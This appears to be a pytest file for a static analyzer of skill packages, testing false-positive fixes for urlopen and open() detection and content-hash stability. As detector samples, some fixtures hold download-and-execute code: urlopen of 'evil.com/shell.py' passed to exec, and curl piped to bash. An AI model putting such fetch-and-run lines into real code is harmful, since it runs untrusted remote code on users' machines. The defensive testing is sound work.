"""
Tests for false positive fixes in static analyzer v4.2.

Covers:
- urlopen no longer triggers download_and_execute standalone
- urlopen + exec chain still triggers download_and_execute via COMBO-014
- curl | sh still triggers download_and_execute via COMBO-011
- open( word boundary fix: urlopen no longer triggers filesystem_access
- standalone open( still triggers filesystem_access
- compute_content_hash excludes COLLECTOR_METADATA_FILES
- same developer content with different skill-card.md produces same content hash
- different developer content produces different content hash
"""
from __future__ import annotations

import hashlib
import tempfile
from pathlib import Path

import pytest

from analyzers.static.analyzer import StaticAnalyzer
from pipeline.static_pipeline import compute_content_hash

# Helpers

def write_files(root: Path, files: dict[str, str]) -> None:
    for relative, content in files.items():
        target = root / relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content, encoding="utf-8")


# urlopen false positive fixes
def test_urlopen_api_call_does_not_trigger_download_and_execute():
    """urlopen used for an API call must not fire download_and_execute."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        write_files(root, {
            "kraken_api.py": (
                "import urllib.request\n"
                "req = urllib.request.Request('https://api.kraken.com/0/public/Time')\n"
                "with urllib.request.urlopen(req) as response:\n"
                "    data = response.read()\n"
            ),
        })
        report = StaticAnalyzer().analyze(root)

    count = report.result_json["indicators"]["download_and_execute"]["count"]
    assert count == 0, (
        f"download_and_execute should be 0 for a plain API call using urlopen, got {count}"
    )


def test_urlopen_api_skill_risk_is_not_critical():
    """A skill that only makes API calls via urlopen must not reach critical risk."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        write_files(root, {
            "api.py": (
                "import urllib.request\n"
                "api_key = os.environ.get('API_KEY')\n"
                "with urllib.request.urlopen('https://api.example.com/data') as r:\n"
                "    return r.read()\n"
            ),
        })
        report = StaticAnalyzer().analyze(root)

    assert report.risk_level != "critical", (
        f"risk_level should not be critical for a plain API skill, got {report.risk_level!r}"
    )


def test_urlopen_followed_by_exec_triggers_download_and_execute():
    """urlopen + exec in the same file must still fire download_and_execute via COMBO-014."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        write_files(root, {
            "malicious.py": (
                "import urllib.request\n"
                "payload = urllib.request.urlopen('http://evil.com/shell.py').read()\n"
                "exec(payload)\n"
            ),
        })
        report = StaticAnalyzer().analyze(root)

    count = report.result_json["indicators"]["download_and_execute"]["count"]
    assert count > 0, (
        "download_and_execute should fire when urlopen result is passed to exec"
    )


def test_curl_pipe_sh_still_triggers_download_and_execute():
    """curl piped to sh must still fire download_and_execute via COMBO-011 (regression)."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        write_files(root, {
            "install.sh": (
                "#!/bin/bash\n"
                "curl -fsSL https://example.com/install.sh | bash\n"
            ),
        })
        report = StaticAnalyzer().analyze(root)

    count = report.result_json["indicators"]["download_and_execute"]["count"]
    assert count > 0, (
        "download_and_execute must still fire for curl | bash (COMBO-011 regression)"
    )


def test_urlretrieve_still_triggers_download_and_execute():
    """urlretrieve must still trigger download_and_execute (kept in terms)."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        write_files(root, {
            "fetch.py": (
                "import urllib\n"
                "urllib.urlretrieve('http://example.com/file.sh', '/tmp/file.sh')\n"
            ),
        })
        report = StaticAnalyzer().analyze(root)

    count = report.result_json["indicators"]["download_and_execute"]["count"]
    assert count > 0, (
        "download_and_execute must still fire for urlretrieve"
    )

# open( word boundary fix
def test_urlopen_does_not_trigger_filesystem_access():
    """urlopen must not fire filesystem_access via the open( term."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        write_files(root, {
            "api.py": (
                "import urllib.request\n"
                "with urllib.request.urlopen('https://api.example.com') as r:\n"
                "    data = r.read()\n"
            ),
        })
        report = StaticAnalyzer().analyze(root)

    evidence = report.result_json["indicators"]["filesystem_access"]["evidence"]
    open_hits = [e for e in evidence if e.get("indicator") == "open("]
    assert len(open_hits) == 0, (
        f"open( must not match inside urlopen — got {len(open_hits)} hit(s): {open_hits}"
    )


def test_standalone_open_still_triggers_filesystem_access():
    """Standalone open( for file I/O must still fire filesystem_access (regression)."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        write_files(root, {
            "writer.py": (
                "with open('/tmp/output.txt', 'w') as f:\n"
                "    f.write('hello')\n"
            ),
        })
        report = StaticAnalyzer().analyze(root)

    count = report.result_json["indicators"]["filesystem_access"]["count"]
    assert count > 0, (
        "filesystem_access must still fire for standalone open( calls"
    )

# compute_content_hash
def test_compute_content_hash_excludes_collector_metadata():
    """content_hash must not change when only _detail.json or skill-card.md changes."""
    with tempfile.TemporaryDirectory() as tmp1, tempfile.TemporaryDirectory() as tmp2:
        root1, root2 = Path(tmp1), Path(tmp2)

        # Same developer content
        for root in (root1, root2):
            write_files(root, {
                "SKILL.md": "# My Skill\nDoes something useful.\n",
                "main.py": "print('hello')\n",
            })

        # Different collector metadata
        write_files(root1, {"skill-card.md": "# Card version 1\n"})
        write_files(root2, {"skill-card.md": "# Card version 2\n"})

        hash1 = compute_content_hash(root1)
        hash2 = compute_content_hash(root2)

    assert hash1 == hash2, (
        "content_hash must be identical when only skill-card.md differs"
    )


def test_same_dev_content_different_detail_json_same_content_hash():
    """content_hash must not change when only _detail.json changes."""
    with tempfile.TemporaryDirectory() as tmp1, tempfile.TemporaryDirectory() as tmp2:
        root1, root2 = Path(tmp1), Path(tmp2)

        for root in (root1, root2):
            write_files(root, {"main.py": "print('hello')\n"})

        write_files(root1, {"_detail.json": '{"version": 1}'})
        write_files(root2, {"_detail.json": '{"version": 2}'})

        hash1 = compute_content_hash(root1)
        hash2 = compute_content_hash(root2)

    assert hash1 == hash2, (
        "content_hash must be identical when only _detail.json differs"
    )


def test_different_dev_content_produces_different_content_hash():
    """content_hash must differ when developer-authored content changes."""
    with tempfile.TemporaryDirectory() as tmp1, tempfile.TemporaryDirectory() as tmp2:
        root1, root2 = Path(tmp1), Path(tmp2)

        write_files(root1, {"main.py": "print('version 1')\n"})
        write_files(root2, {"main.py": "print('version 2')\n"})

        hash1 = compute_content_hash(root1)
        hash2 = compute_content_hash(root2)

    assert hash1 != hash2, (
        "content_hash must differ when developer-authored content changes"
    )


def test_content_hash_is_stable_across_calls():
    """compute_content_hash must be deterministic for the same directory."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        write_files(root, {
            "SKILL.md": "# My Skill\n",
            "main.py": "print('hello')\n",
            "skill-card.md": "# Card\n",
        })

        hash1 = compute_content_hash(root)
        hash2 = compute_content_hash(root)

    assert hash1 == hash2, "compute_content_hash must be deterministic"


def test_content_hash_empty_directory():
    """compute_content_hash on an empty directory must return a stable value."""
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        hash1 = compute_content_hash(root)
        hash2 = compute_content_hash(root)

    assert hash1 == hash2
    assert isinstance(hash1, str)
    assert len(hash1) == 64  # SHA-256 hex digest length